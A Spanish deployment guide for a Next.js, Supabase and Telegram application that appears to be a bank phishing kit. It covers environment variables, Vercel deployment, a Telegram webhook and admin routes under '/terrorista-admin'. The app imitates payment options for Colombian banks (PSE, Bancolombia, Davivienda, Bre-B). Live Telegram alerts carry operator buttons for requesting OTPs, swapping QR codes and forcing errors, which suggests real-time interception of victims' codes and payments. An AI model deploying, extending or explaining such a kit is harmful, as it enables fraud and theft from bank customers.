🔑 1. Variables de Entorno (.env) para Producción

Al subir a Vercel o tu plataforma de hosting, agrega estas variables en la sección de Environment Variables:

Variable Estado Descripción y Regla
TELEGRAM_DTA OBLIGATORIO Identificador único del proyecto en Supabase (Multi-tenant). Aísla bancos, configuraciones y QRs para que nunca se mezclen entre proyectos.
TELEGRAM_BOT OBLIGATORIO Token del bot de Telegram que envía alertas y responde a los botones de control (TOKEN:HASH).
TELEGRAM_CHAT OBLIGATORIO Chat ID o ID del grupo de Telegram donde se reciben las alertas en tiempo real (ej. -1003775321635).
NEXT_PUBLIC_SUPABASE_URL OBLIGATORIO URL del proyecto Supabase principal (base de datos y configuraciones globales).
NEXT_PUBLIC_SUPABASE_ANON_KEY OBLIGATORIO Clave pública (Anon Key) del proyecto Supabase principal.
NEXT_PUBLIC_QR_SUPABASE_URL OBLIGATORIO URL del Supabase dedicado exclusivamente al Storage de Códigos QR.
NEXT_PUBLIC_QR_SUPABASE_ANON_KEY OBLIGATORIO Clave Anon del Storage de Códigos QR.
QR_SUPABASE_BUCKET NO CAMBIAR Nombre del bucket de imágenes (debe ser exactamente: qr_codes).
PROYECTO OPCIONAL Nombre descriptivo del proyecto en las notificaciones (ej. PYP).
OFFER_PAGE NO CAMBIAR Ruta inicial de la oferta (dejar siempre en /).
TELEGRAM_CHAT_LOGS OPCIONAL ID del canal para monitoreo de logs del servidor y accesos de seguridad.
⚠️
IMPORTANTE: Las variables que comienzan con NEXT_PUBLIC_ son consumidas en el navegador del cliente. Nunca expongas la SERVICE_ROLE_KEY de Supabase en estas variables.

🚀 2. Paso a Paso para Desplegar en Vercel

1

Subir el código a GitHub / GitLab

Haz push de tu repositorio manteniendo la estructura limpia y sin incluir el archivo local .env ni la carpeta node_modules.

2

Importar el proyecto en Vercel

Inicia sesión en Vercel, haz clic en "Add New Project" y selecciona tu repositorio.

3

Configuración de Build

Vercel detectará automáticamente Next.js:

  • Framework Preset: Next.js
  • Build Command: next build (por defecto)
  • Output Directory: .next (por defecto)
4

Cargar las Variables de Entorno

En la sección "Environment Variables" de Vercel, copia y pega todas las variables listadas en la tabla anterior.

5

Hacer clic en "Deploy"

Espera entre 1 y 2 minutos hasta que Vercel termine la compilación y genere tu dominio de producción (ej. https://tu-proyecto.vercel.app).

🤖 3. Configurar el Webhook de Telegram

Para que los botones interactivos de Telegram (🔑 OTP, 📱 QR, ❌ Error, etc.) respondan al instante en producción, debes registrar el webhook apuntando a tu dominio de Vercel:

https://api.telegram.org/bot<TU_BOT_TOKEN>/setWebhook?url=https://<TU-DOMINIO-VERCEL.app>/api/banco/webhook
✅
Verificación: Al abrir esa URL en tu navegador, Telegram debe responder:
{"ok":true,"result":true,"description":"Webhook was set"}

🛡️ 4. Panel de Control y Rutas de Administración

El sistema cuenta con un panel XDM protegido para gestionar todo en tiempo real:

Ruta Admin Propósito y Operación
/terrorista-admin/bancos Gestión de Bancos PSE y QR:
  • Switch Banco: Activa o desactiva el banco en el formulario PSE.
  • Switch QR: Configura para ese banco específico si solicita el pago mediante el QR Bre-B.
/terrorista-admin/qrs Gestión de Códigos QR Bre-B: Carga la imagen del QR activo, asigna el alias y estado del código QR que verán los usuarios.
/terrorista-admin/pagos Medios de Pago Principales: Activa o desactiva los 6 botones de la página inicial (PSE, Bancolombia, TC, TD, Davivienda, Bre-B).

🚫 5. Lo que NUNCA debes modificar ni alterar

🛑
  • NO cambies el valor de TELEGRAM_DTA en un proyecto activo sin sincronizar antes su tabla en Supabase, ya que perderá el enlace con sus configuraciones y bancos.
  • NO toques los endpoints de la API (/api/bancos, /api/payment-options, /api/banco/status, etc.), están optimizados para tiempo real.
  • NO utilices librerías pesadas externas que aumenten el bundle innecesariamente; el proyecto usa utilidades nativas y Tailwind v4.
